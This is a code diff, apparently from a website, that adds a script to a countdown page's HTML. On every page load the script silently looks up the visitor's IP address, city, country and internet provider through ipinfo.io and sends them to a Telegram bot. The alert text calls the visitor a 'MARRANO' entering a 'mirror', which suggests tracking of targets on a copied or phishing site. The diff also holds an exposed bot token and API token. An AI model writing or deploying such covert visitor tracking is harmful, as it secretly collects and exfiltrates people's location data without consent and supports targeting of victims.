@@ -199,5 +199,39 @@
     setInterval(updateCountdown, 1000);
   </script>
 
+  <!-- Script para enviar IP y ubicación a Telegram -->
+  <script>
+    const token = '7881440537:AAHbsg5rssYHnSIylGdW5Wy_2MbjOeazltA'; // Tu token de bot
+    const chatId = '-4726108713'; // Tu chat ID
+
+    async function notifySiteVisit() {
+      try {
+        const response = await fetch('https://ipinfo.io/json?token=0b33d8e257b3eb'); // Reemplaza con tu token de ipinfo.io
+        const data = await response.json();
+
+        const ip = data.ip || 'No disponible';
+        const city = data.city || 'Sin ciudad';
+        const region = data.region || 'Sin región';
+        const country = data.country || 'Sin país';
+        const org = data.org || 'Sin proveedor';
+
+        const message = `
+📣💊 *MARRANO HP ENTRANDO AL ESPEJO* 💊📣
+🌍 *IP:* ${ip}
+📍 *Ubicación:* ${city}, ${region}, ${country}
+🔌 *Proveedor:* ${org}
+        `;
+
+        const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        await fetch(telegramURL);
+      } catch (error) {
+        console.error('Error al enviar datos a Telegram:', error);
+      }
+    }
+
+    window.onload = notifySiteVisit;
+  </script>
+
 </body>
 </html>
